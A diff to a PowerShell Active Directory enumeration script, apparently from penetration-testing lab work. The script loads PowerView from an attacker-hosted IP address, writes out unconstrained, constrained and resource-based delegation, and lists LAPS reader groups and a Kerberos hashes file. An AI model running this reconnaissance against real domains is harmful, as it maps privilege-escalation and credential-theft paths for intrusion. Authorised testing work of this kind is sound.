@@ -8,7 +8,8 @@
       * <domain>_computers.txt
       * <domain>_users.txt
       * <domain>_unconstrained.txt
-      * <domain>_constrained.txt
+      * <domain>_user_constrained.txt
+      * <domain>_computer_constrained.txt
       * <domain>_rbcd.txt
       * <domain>_ForeignGroupMember.txt
       * <domain>_kerberos_hashes.txt
@@ -21,7 +22,7 @@
 #>
 
 # Configuration
-$PowerViewURL = 'http://192.168.45.218/PowerView.ps1'
+$PowerViewURL = 'http://192.168.45.219/PowerView.ps1'
 
 # Load PowerView
 Write-Host 'Loading PowerView...' -ForegroundColor Magenta
@@ -106,9 +107,6 @@ foreach ($d in $domains) {
     Write-Host '  Users file:' -NoNewline; Write-Host " $usersFile" -ForegroundColor Yellow
     Get-Content $usersFile | ForEach-Object { Write-Host "    $_" }
 
-    # ——————————————
-    # Delegation Checks for this domain:
-
     # 1) Unconstrained delegation
     $uFile = "${d}_unconstrained.txt"
     Get-DomainComputer -Domain $d -Unconstrained |
@@ -118,15 +116,29 @@ foreach ($d in $domains) {
     Get-Content $uFile | ForEach-Object { Write-Host "    $_" }
     Write-Host ""
 
-    # 2) Constrained delegation
-    $cFile = "${d}_constrained.txt"
+    # 2) User-based constrained delegation
+    $cFile = "${d}_user_constrained.txt"
     Get-DomainUser -Domain $d -TrustedToAuth |
       ForEach-Object {
           "{0} : {1}" -f $_.Name, (($_.'msds-allowedtodelegateto') -join ', ')
       } |
       Out-File $cFile -Encoding utf8
-    Write-Host "  Constrained delegations: $cFile" -ForegroundColor Yellow
+    Write-Host "  User-based constrained delegations: $cFile" -ForegroundColor Yellow
     Get-Content $cFile | ForEach-Object { Write-Host "    $_" }
+    Write-Host ""
+
+    # 2b) Computer-account constrained delegation (classic)
+    $kcdFile = "${d}_computer_constrained.txt"
+    Get-DomainComputer -Domain $d -Properties name,msds-allowedtodelegateto |
+      Where-Object { $_.'msds-allowedtodelegateto' } |
+      ForEach-Object {
+          $source = $_.Name
+          $targets = $_.'msds-allowedtodelegateto' -join ', '
+          "{0} => {1}" -f $source, $targets
+      } |
+      Out-File $kcdFile -Encoding utf8
+    Write-Host "  Computer-account constrained delegations: $kcdFile" -ForegroundColor Yellow
+    Get-Content $kcdFile | ForEach-Object { Write-Host "    $_" }
     Write-Host ""
 
     # 3) RBCD delegations (Identity: ComputerName)
@@ -200,7 +212,6 @@ foreach ($d in $domains) {
     Write-Host "  LAPS reader groups: $lapsGroupFile" -ForegroundColor Yellow
     Get-Content $lapsGroupFile | ForEach-Object { Write-Host "    $_" }
     Write-Host ""
-    # ——————————————
 
     # Accumulate potential active users with Groups
     $activeUsers = $users |
@@ -244,4 +255,3 @@ Write-Host "`nHosts Entries file: etc_hosts.txt" -ForegroundColor Yellow
 Get-Content 'etc_hosts.txt' | ForEach-Object { Write-Host "  $_" }
 
 Write-Host 'Done!' -ForegroundColor Magenta
-
